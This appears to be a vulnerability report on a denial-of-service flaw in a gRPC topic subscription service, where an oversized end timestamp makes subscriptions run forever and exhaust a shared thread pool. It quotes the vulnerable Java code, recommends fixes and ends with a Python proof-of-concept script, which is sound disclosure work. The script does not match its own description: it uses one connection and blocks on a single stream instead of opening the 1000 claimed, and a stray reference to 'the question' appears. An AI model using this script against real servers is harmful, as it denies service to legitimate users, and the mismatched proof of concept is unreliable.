### Title
Indefinite Subscription Resource Exhaustion via Long.MAX_VALUE consensusEndTime

### Summary
An unprivileged external user can send a `subscribeTopic()` gRPC request with `consensusEndTime.seconds >= 9223372035L`, which `convertTimestamp()` maps to `Long.MAX_VALUE`. This causes `isComplete()` to permanently return `false` (the computed `Instant` falls in year ~2262), so the subscription never self-terminates. The per-connection limit of 5 concurrent calls does not prevent an attacker from opening many connections, exhausting the shared `applicationTaskExecutor` thread pool and denying service to legitimate subscribers.

### Finding Description

**Code path 1 — timestamp coercion:**
`ConsensusController.java`, `convertTimestamp()`, lines 77–79:
```java
if (timestamp.getSeconds() >= 9223372035L) {
    return Long.MAX_VALUE;
}
```
Any client-supplied timestamp with `seconds >= 9223372035L` is silently promoted to `Long.MAX_VALUE` (= `9223372036854775807` nanoseconds).

**Code path 2 — `isComplete()` never fires:**
`TopicMessageServiceImpl.java`, `TopicContext.isComplete()`, lines 203–215:
```java
boolean isComplete() {
    if (filter.getEndTime() == null) { return false; }
    if (filter.getEndTime() < startTime) { return true; }
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())
            .isBefore(Instant.now());
}
```
With `endTime = Long.MAX_VALUE`:
- Branch 1: `endTime != null` → not taken.
- Branch 2: `Long.MAX_VALUE < startTime` → false (it is the largest `long`).
- Branch 3: `Instant.ofEpochSecond(0, Long.MAX_VALUE)` normalises to epoch-second `9223372036` (~year 2262). Adding 30 s still yields ~year 2262. `.isBefore(Instant.now())` → `false`.

Result: `isComplete()` **always returns `false`** for the lifetime of the server.

**Code path 3 — `pastEndTime()` never emits:**
`TopicMessageServiceImpl.java`, lines 123–131:
```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```
Because `endTime != null`, the `Flux.never()` fast-path is skipped. The returned flux repeats `Long.MAX_VALUE` times at 30-second intervals but never emits an item (it is `Flux.empty()` repeated). `takeUntilOther(pastEndTime(...))` therefore never terminates the live stream.

**Code path 4 — `takeWhile` does not terminate:**
`TopicMessageServiceImpl.java`, line 80:
```java
flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
```
`t.getConsensusTimestamp() < Long.MAX_VALUE` is always `true` for any real message.

**Validation bypass:**
`TopicMessageFilter.java`, lines 43–51:
```java
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();
}
```
`Long.MAX_VALUE > startTime` → `true`. Both constraints pass without error.

### Impact Explanation
Each crafted subscription holds an executor thread indefinitely and schedules periodic work on `Schedulers.boundedElastic()` every 30 seconds. The `maxConcurrentCallsPerConnection = 5` limit (`NettyProperties.java`, line 14; `GrpcConfiguration.java`, line 33) is **per-connection only** — there is no global cap on total active subscriptions. An attacker opening `N` connections injects up to `5N` permanent subscriptions, exhausting the `applicationTaskExecutor` pool and starving legitimate subscribers of threads. The "reorganized order" framing in the question is not supported by the code; the actual impact is availability loss (DoS).

### Likelihood Explanation
No authentication is required. The gRPC port (default 5600) is publicly reachable. The crafted field is a standard protobuf `Timestamp` with `seconds` set to any value `>= 9223372035`. Any scripted client (e.g., `grpcurl`, a custom gRPC stub) can reproduce this. The attack is repeatable and scalable.

### Recommendation
1. **Cap `endTime` at a reasonable future horizon** in `convertTimestamp()` rather than mapping overflow to `Long.MAX_VALUE`. Reject or clamp timestamps that exceed, e.g., `now + 30 days`.
2. **Add a global concurrent-subscription limit** (not just per-connection) enforced in `TopicMessageServiceImpl.subscribeTopic()`, using the existing `subscriberCount` gauge.
3. **Treat `endTime = Long.MAX_VALUE` the same as `endTime = null`** in `pastEndTime()` and `isComplete()` to restore the `Flux.never()` fast-path and avoid the spurious periodic scheduling.

### Proof of Concept
```python
# pip install grpcio grpcio-tools
import grpc
from proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import timestamp_pb2, basic_types_pb2

channel = grpc.insecure_channel("mirror-node-host:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    consensusEndTime=timestamp_pb2.Timestamp(seconds=9223372035),  # >= threshold
)

# Open many connections, each with 5 streams
for _ in range(200):
    for response in stub.subscribeTopic(query):
        pass  # subscription never completes; thread held indefinitely
```

Each call returns a stream that never completes. With 200 connections × 5 calls each = 1000 permanent subscriptions, the executor pool is exhausted and legitimate subscribers time out. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)
